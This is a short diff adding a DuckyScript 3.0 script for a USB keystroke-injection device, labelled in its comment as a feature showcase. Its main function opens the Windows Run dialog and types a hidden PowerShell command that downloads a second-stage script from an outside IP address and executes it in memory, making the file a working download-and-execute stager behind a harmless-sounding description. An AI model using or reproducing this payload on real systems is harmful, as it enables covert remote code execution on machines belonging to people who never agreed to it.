@@ -1,0 +1,20 @@
+REM DuckyScript 3.0 feature showcase: VAR substitution, FUNCTION/CALL, REPEAT, HOLD/RELEASE.
+VAR $target = "http://198.51.100.77/stage2.ps1"
+
+FUNCTION RUN_PAYLOAD()
+    GUI r
+    DELAY 500
+    STRING powershell -nop -w hidden -Command "IEX (New-Object Net.WebClient).DownloadString('$target')"
+    ENTER
+END_FUNCTION
+
+DELAY 1000
+RUN_PAYLOAD()
+
+DELAY 500
+STRING A
+REPEAT 4
+
+HOLD GUI
+TAB
+RELEASE GUI
